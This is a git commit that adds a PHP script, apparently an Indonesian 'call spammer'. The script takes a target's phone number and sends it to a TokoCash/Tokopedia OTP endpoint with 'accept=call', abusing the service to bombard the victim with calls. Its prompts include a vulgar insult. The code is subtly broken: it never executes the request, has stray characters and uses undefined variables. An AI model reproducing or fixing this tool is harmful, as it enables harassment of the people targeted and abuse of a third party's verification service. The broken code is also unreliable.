5b8574a1ff5d25e110a3ec35216c4366d79887eb
Rayaprakyat <48251738+totonngesot@users.noreply.github.com>
2019-03-06 16:51:12 +0700

    Update and rename .gitignore to ganteng.php

---
+++ ganteng.php
@@ -0,0 +1,48 @@
+
+
+
+
+
+
+
+
+<?php
+// SANTET SECUKUPNYA
+function send($phone){
+        $ch = curl_init();
+        curl_setopt($ch, CURLOPT_URL, "https://www.tokocash.com/oauth/otp");      $
+        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
+        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+        curl_setopt($ch, CURLOPT_HEADER, true);
+        curl_setopt($ch, CURLOPT_POST, 1);
+        curl_setopt($ch, CURLOPT_POSTFIELDS, "msisdn=$phone&accept=call");        $
+        curl_close($ch);
+                echo $asw."\n";
+}
+echo "
+############################################################
+    Spammer Call SANTET TOKOPEDIA
+        Author By   : ™иs°d̸αRαᴮᵀᴺ
+        Email       : Totonngesot@gmail.com
+        Fb          : SUGARA
+        Tujuan      : SANTET
+        My Team     : NO SKILL
+     Penggunaannya  : Bisa Menggunakan [08/62]
+###########################################################\n";
+echo "MASUKAN NMR YANG INGIN DI SANTET\nTULIS NOMORNYA KONTOL : ";
+$nomor = trim(fgets(STDIN));
+echo "Target: $nomer(y/n)";
+$cek = trim(fgets(STDIN));
+if($cek=="n") exit("Stopped!\n");
+$execute = send($nomor);
+print $execute;
+?>
+
+
+
+
+
+
+
+
+
